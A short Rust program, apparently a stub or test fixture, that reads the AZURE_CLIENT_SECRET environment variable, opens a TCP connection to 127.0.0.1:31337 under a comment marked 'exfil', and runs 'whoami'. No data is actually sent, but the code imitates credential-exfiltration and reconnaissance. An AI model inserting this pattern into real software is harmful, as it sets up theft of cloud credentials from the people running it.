use std::env;
use std::net::TcpStream;
use std::process::Command;
fn main() {
    if let Ok(_s) = TcpStream::connect("127.0.0.1:31337") { /* exfil */ }
    let _v = env::var("AZURE_CLIENT_SECRET").unwrap_or_default();
    Command::new("whoami").spawn().ok();
}
